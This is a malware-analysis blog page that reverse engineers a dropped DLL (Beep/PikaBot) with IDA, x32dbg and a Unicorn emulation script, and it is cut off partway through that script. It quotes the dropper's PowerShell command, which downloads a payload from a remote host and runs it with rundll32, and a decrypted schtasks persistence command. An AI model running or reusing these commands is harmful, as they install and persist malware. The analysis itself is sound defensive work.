<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Analyzing Beep Malware | Journal of Connar</title>
<meta name="keywords" content="beep-malware, PikaBot">
<meta name="description" content="Intro
In continuation from my previous post, I will now be analyzing the dropped big.dll. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.
Analyzing big.dll - Combining IDA and x32dbg
Recall that in our previous post, when the dll was being dropped, a specific exported function was run:
@echo off

powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\programdata\big.jpg
call ru%1l32 C:\programdata\big.jpg,DllRegisterServer

exit
So, let&rsquo;s open the dll in IDA and view the specific function:">
<meta name="author" content="connar, r4sti">
<link rel="canonical" href="http://localhost:1313/posts/beepmalware/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/beepmalware/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
                    <span>My Challenges</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Analyzing Beep Malware
    </h1>
    <div class="post-meta">25 min&nbsp;·&nbsp;connar, r4sti

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#intro" aria-label="Intro">Intro</a></li>
                <li>
                    <a href="#analyzing-bigdll---combining-ida-and-x32dbg" aria-label="Analyzing big.dll - Combining IDA and x32dbg">Analyzing big.dll - Combining IDA and x32dbg</a></li>
                <li>
                    <a href="#analyzing-bigdll---dllregisterserver" aria-label="Analyzing big.dll - DllRegisterServer">Analyzing big.dll - DllRegisterServer</a><ul>
                        
                <li>
                    <a href="#dumping-the-code---decrypted-assembly" aria-label="Dumping the code - Decrypted assembly">Dumping the code - Decrypted assembly</a></li>
                <li>
                    <a href="#dumping-the-code---pe-file-inside-decrypted-assembly" aria-label="Dumping the code - PE file inside decrypted assembly">Dumping the code - PE file inside decrypted assembly</a></li></ul>
                </li>
                <li>
                    <a href="#analyzing-the-embedded_pedll" aria-label="Analyzing the embedded_pe.dll">Analyzing the embedded_pe.dll</a></li>
                <li>
                    <a href="#emulation-of-the-sample-using-unicorn" aria-label="Emulation of the sample using unicorn">Emulation of the sample using unicorn</a><ul>
                        
                <li>
                    <a href="#stack-memory-architecture-permissions" aria-label="Stack, Memory, Architecture, permissions">Stack, Memory, Architecture, permissions</a></li>
                <li>
                    <a href="#hooking-the-code" aria-label="Hooking the code">Hooking the code</a></li>
                <li>
                    <a href="#patch-addresses" aria-label="Patch addresses">Patch addresses</a></li>
                <li>
                    <a href="#reading-the-dll-and-allocating-text-rdata-sections" aria-label="Reading the dll and allocating .text, .rdata sections">Reading the dll and allocating .text, .rdata sections</a></li>
                <li>
                    <a href="#setting-the-stack-pointer-in-the-middle" aria-label="Setting the stack pointer in the middle">Setting the stack pointer in the middle</a></li>
                <li>
                    <a href="#patching-dwords" aria-label="Patching dwords">Patching dwords</a></li>
                <li>
                    <a href="#emulating-the-code" aria-label="Emulating the code">Emulating the code</a></li>
                <li>
                    <a href="#viewing-the-hook_code-function" aria-label="Viewing the hook_code function">Viewing the hook_code function</a><ul>
                        
                <li>
                    <a href="#anti-debug-checks" aria-label="Anti-debug checks">Anti-debug checks</a></li>
                <li>
                    <a href="#patching-eax" aria-label="Patching eax">Patching eax</a><ul>
                        
                <li>
                    <a href="#offset-0x9f0" aria-label="Offset 0x9f0">Offset 0x9f0</a></li>
                <li>
                    <a href="#offset-0xa3e" aria-label="Offset 0xa3e">Offset 0xa3e</a></li>
                <li>
                    <a href="#offset-0xaa4" aria-label="Offset 0xaa4">Offset 0xaa4</a></li></ul>
                </li>
                <li>
                    <a href="#decrypting-b64-encrypted-data" aria-label="Decrypting b64 encrypted data">Decrypting b64 encrypted data</a></li>
                <li>
                    <a href="#main-loop" aria-label="Main loop">Main loop</a><ul>
                        
                <li>
                    <a href="#main-loop---cmp--mov-instructions" aria-label="Main loop - cmp &amp; mov instructions">Main loop - cmp &amp; mov instructions</a></li>
                <li>
                    <a href="#main-loop---call-instruction" aria-label="Main loop - call instruction">Main loop - call instruction</a></li></ul>
                </li>
                <li>
                    <a href="#running-our-code" aria-label="Running our code">Running our code</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
<p>In continuation from my previous <a href="https://connar.github.io/posts/onenote/">post</a>, I will now be analyzing the dropped <code>big.dll</code>. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.</p>
<h2 id="analyzing-bigdll---combining-ida-and-x32dbg">Analyzing big.dll - Combining IDA and x32dbg<a hidden class="anchor" aria-hidden="true" href="#analyzing-bigdll---combining-ida-and-x32dbg">#</a></h2>
<p>Recall that in our previous post, when the dll was being dropped, a specific exported function was run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>@<span style="color:#66d9ef">echo</span> off
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\programdata\big.jpg
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">call</span> ru%1l32 C:\programdata\big.jpg,DllRegisterServer
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">exit</span>
</span></span></code></pre></div><p>So, let&rsquo;s open the dll in IDA and view the specific function:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep1.png" alt=""  />
</p>
<p>Let&rsquo;s also open the dll in x32dbg and having it side by side with IDA. We can dynamically analyze a malware with x32dbg while also statically comparing it with IDA.</p>
<p><img loading="lazy" src="/posts/beepMalware/beep2.png" alt=""  />
</p>
<p>The thing is, if we try and run the dll in x32dbg, it will keep exiting due to many anti-debugging checks. We can skip all these and land to <code>DllRegisterServer</code> by just changing the <code>EIP</code> to that part of the code and continue execution from there. Do to so, we need to first find the <code>DllRegisterServer</code> function and then set the <code>EIP</code> there:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep3.png" alt=""  />
</p>
<p>Here we used <code>CTRL+G</code> to find the location of the function. After we have landed on the function, just right click&ndash;&gt;Set EIP Here:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep4.png" alt=""  />
</p>
<p>Since we are using both IDA and x32dbg, it would be a good thing to have the same addresses in both applications. To do so, I got the base address of the PE by going to x32dbg&ndash;&gt;Memory Map and copying the address where the <code>.text</code> section starts:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep5.png" alt=""  />
</p>
<p>Then, I just navigated to IDA&ndash;&gt;Edit&ndash;&gt;Segments&ndash;&gt;Rebase program&hellip; and changed the base address to that of the x32dbg. Now we should have the same addresses and can start our analysis.</p>
<h2 id="analyzing-bigdll---dllregisterserver">Analyzing big.dll - DllRegisterServer<a hidden class="anchor" aria-hidden="true" href="#analyzing-bigdll---dllregisterserver">#</a></h2>
<p>Viewing the code at first, I did not make a lot of sense as there as many functions that seem to be doing some math operations, possibly a runtime decryption&hellip;?</p>
<p>The thing I knew about malware is that usually there will be a virtual allocation of memory in order for the malware to write and execute code at runtime. So I turned to the imported functions in IDA and found the references on the VirtualAlloc one. This led me to the following part of the code:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep6.png" alt=""  />
</p>
<p>We see that a call to <code>VirtualAlloc</code> is happening and right after it a function is called - which is also doing some math operations in a loop. My assumption is that after the allocation of the memory is complete, something is going to be written there, so I got the address of the call to <code>VirtualAlloc</code> and turned back to x32dbg where I put a breakpoint at that part:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep7.png" alt=""  />
</p>
<p>Our goal is to get the address that <code>VirtualAlloc</code> will return. This is why at that address something will most likely be written. Something of highly interest!</p>
<p>Running the program, we hit F9 to get to that breakpoint and the execution stops at the call to <code>VirtualAlloc</code>. Then, we just hit F8 to move to the next operation (after the <code>VirtualAlloc</code> is complete) and see that a value is moved from <code>eax</code> to <code>[edi+8C]</code>. Taking a notice at the address stored at <code>eax</code>, we will get the address of the virtually allocated space previously allocated from <code>VirtualAlloc</code>:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep8.png" alt=""  />
</p>
<p>A good trick that r4sti taught me is to put a hardware write breakpoint at the first byte of the memory allocated space . This is done in order to stop execution at that part when something is written to it. So basically we found the memory allocated space and now we are going to find out what will be written to it:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep9.png" alt=""  />
</p>
<p>After our hardware write bp is set, let&rsquo;s press F9 and see where the code execution went:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep10.png" alt=""  />
</p>
<p>We see our first byte has been written - please ignore the difference address between the images. It&rsquo;s cause of <code>ASLR</code> and the fact that I was reloading the sample while writting this post.  Now, to get the fully written bytes, let&rsquo;s remove the breakpoint and then place it again at the same position. This is because, when all bytes are written to the allocated space, most likely a call to that address will happen as it will contain some short of code:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep11.png" alt=""  />
</p>
<p>After the allocated space is fully written, we see the execution stopped at the function <code>sub_70761000</code>:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep12.png" alt=""  />
</p>
<p>Having the fully written bytes, we cannot make anything of it. They seem encrypted.</p>
<p>Exploring the function that the execution stopped, we notice that there is code execution since a stdcall is taking place:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep13.png" alt=""  />
</p>
<p>So since the execution stopped at that function based on the breakpoint set at the vallocated space, some use of these bytes is taking place. Let&rsquo;s remove once again the breakpoint and replace it at the same byte and see what happens:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep14.png" alt=""  />
</p>
<p>The code has stopped on the call eax were it will execute the bytes written in the allocated space. What we notice is that the bytes have now changed. We can also spot an executable written inside that memory allocated space:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep15.png" alt=""  />
</p>
<p>Since its a stdcall on bytes, its probably decrypted assembly code, so let&rsquo;s proceed by dumping the memory to a file and analyzing it further. We will also separately get the PE file found inside the decrypted code.</p>
<h3 id="dumping-the-code---decrypted-assembly">Dumping the code - Decrypted assembly<a hidden class="anchor" aria-hidden="true" href="#dumping-the-code---decrypted-assembly">#</a></h3>
<p>To dump the fully decrypted code, we must click on the first byte and follow it in the memory map:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep16.png" alt=""  />
</p>
<p>Then simply right click on the memory address and use &ldquo;Dump Memory to File&rdquo;.</p>
<p>Opening the dumped file in IDA, we see the following code:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep17.png" alt=""  />
</p>
<p>Yet another call to something is being made. If we load this in x32dbg and breakpoint at that address, we will see it executes the PE file previously found embedded in the decrypted assembly code. So for the sake of simplicity, let&rsquo;s analyze it straight ahead (as we already saw how we would do that).</p>
<h3 id="dumping-the-code---pe-file-inside-decrypted-assembly">Dumping the code - PE file inside decrypted assembly<a hidden class="anchor" aria-hidden="true" href="#dumping-the-code---pe-file-inside-decrypted-assembly">#</a></h3>
<p>The way I got the PE file was by using the <code>pecheck.py</code> tool by <code>Steven Didier</code> which basically identifies and extracts PE files embedded in other filetypes. The command I used is:</p>
<pre tabindex="0"><code>python pecheck.py -l 1 -g s -D dumped_decrypted_assembly.bin &gt; embedded_pe.dll
</code></pre><p>We can get a general idea of this dll by loading it to VT which will notify us how malicious it is:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep18.png" alt=""  />
</p>
<p>It&rsquo;s time to start analyzing the decrypted dll now as this seems to be doing all the nasty work.</p>
<h2 id="analyzing-the-embedded_pedll">Analyzing the embedded_pe.dll<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-embedded_pedll">#</a></h2>
<p>Opening the .dll and viewing its <code>EntryPoint</code> function, we see a call to <code>sub_708611C9</code>, which by opening it, it&rsquo;s clear there are many string decryptions going on but also many anti-debug checks:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep19.png" alt=""  />
</p>
<p>Let&rsquo;s try decrypting one of the strings.<br>
Opening the file in x32dbg, we can rebase the program in IDA and set breakpoints on the addresses of interest. One bp will be in the starting address of the function <code>sub_708611C9</code> and another one after a decryption loop its over. In this example, we will be viewing the decrypted string with <code>offset 62E</code>.</p>
<p>Pressing F9 on x32dbg, the program stops in the <code>sub_708611C9</code>. We hit again F9 to skip to the next bp which is right after the decryption loop. This means that if we follow in dump the memory address to which each decrypted byte was stored, we should see the fully decrypted string:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep20.png" alt=""  />
</p>
<pre tabindex="0"><code>schtasks.exe /Create /F /TN &#34;%s&#34; /TR &#34; cmd /q /c start /min \&#34;\&#34; powershell \&#34;$%s = Get-ItemProperty -Path HKCU:\Software\%s; powershell -encodedcommand $%s.%s \&#34;&#34; /SC MINUTE /MO %s
</code></pre><p>We also see a hardcoded mutex and some other api functions:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep21.png" alt=""  />
</p>
<p>Now, if we wanted to decrypt all strings, we would certainly not do it manually as it would be very time consuming. The way to go here is to emulate the malware&rsquo;s behavior and print the decrypted strings on the run. We can also patch addresses this way to avoid anti-debug checks and modify registers amongst other things. Special thanks again to my friend r4sti for familiarizing me with the unicorn engine, an engine that is used for this very purpose.</p>
<p>Below I will show and breakdown the script r4sti made using unicorn to decrypt all strings of the <code>embedded_pe.dll</code>.</p>
<h2 id="emulation-of-the-sample-using-unicorn">Emulation of the sample using unicorn<a hidden class="anchor" aria-hidden="true" href="#emulation-of-the-sample-using-unicorn">#</a></h2>
<p>The full script that I will be breaking down and explaining each part is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> unicorn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> unicorn.x86_const <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> capstone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pefile
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curr_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook_code</span>(uc, address, size, user_data):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> curr_offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> address <span style="color:#f92672">==</span> memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x9f8</span>:
</span></span><span style="display:flex;"><span>        uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> address <span style="color:#f92672">in</span> PATCH_ADDRESSES:
</span></span><span style="display:flex;"><span>        uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EAX, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> address <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x10001b84</span>, <span style="color:#ae81ff">0x10001bcc</span>]:
</span></span><span style="display:flex;"><span>        off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x420c</span> <span style="color:#66d9ef">if</span> address <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10001b84</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x3298</span>
</span></span><span style="display:flex;"><span>        dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>off, <span style="color:#ae81ff">0x7b8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>b64decode(dec)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> md<span style="color:#f92672">.</span>disasm(uc<span style="color:#f92672">.</span>mem_read(address, size), address):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cmp&#39;</span>:
</span></span><span style="display:flex;"><span>            ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ecx&#39;</span>:
</span></span><span style="display:flex;"><span>                ecx <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_ECX)
</span></span><span style="display:flex;"><span>                val <span style="color:#f92672">=</span> ops[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;edi&#39;</span>:
</span></span><span style="display:flex;"><span>                    val <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EDI)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    val <span style="color:#f92672">=</span> eval(val)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ecx <span style="color:#f92672">==</span> val:
</span></span><span style="display:flex;"><span>                    dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> dec:
</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>dec<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mov&#39;</span>:
</span></span><span style="display:flex;"><span>            ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ptr [ebp +&#39;</span> <span style="color:#f92672">in</span> ops[<span style="color:#ae81ff">0</span>]:
</span></span><span style="display:flex;"><span>                curr_offset <span style="color:#f92672">=</span> eval(i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; - &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;], &#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;call&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>op_str <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;eax&#39;</span>, <span style="color:#e6db74">&#39;ebx&#39;</span>, <span style="color:#e6db74">&#39;esi&#39;</span>]:
</span></span><span style="display:flex;"><span>                uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stack_base  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>stack_size  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf000</span>
</span></span><span style="display:flex;"><span>memory_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001000</span>
</span></span><span style="display:flex;"><span>memory_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>emu <span style="color:#f92672">=</span> Uc(UC_ARCH_X86, UC_MODE_32)
</span></span><span style="display:flex;"><span>md <span style="color:#f92672">=</span> Cs(CS_ARCH_X86, CS_MODE_32)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_map(stack_base, stack_size)
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_map(memory_base, memory_size, UC_PROT_ALL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>hook_add(UC_HOOK_CODE, hook_code)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PATCH_ADDRESSES <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x9f0</span>,
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa3e</span>,
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaa4</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>start_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1c9</span>
</span></span><span style="display:flex;"><span>end_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd92</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pe_handle <span style="color:#f92672">=</span> pefile<span style="color:#f92672">.</span>PE(<span style="color:#e6db74">&#39;embedded_pe.dll&#39;</span>)
</span></span><span style="display:flex;"><span>_text_section <span style="color:#f92672">=</span> pe_handle<span style="color:#f92672">.</span>sections[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>get_data()
</span></span><span style="display:flex;"><span>_rdata_section <span style="color:#f92672">=</span> pe_handle<span style="color:#f92672">.</span>sections[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>get_data()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_write(memory_base, _text_section)
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_write(memory_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2000</span>, _rdata_section)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>reg_write(UC_X86_REG_ESP, stack_base<span style="color:#f92672">+</span>stack_size<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_write(<span style="color:#ae81ff">0x10005000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span> 
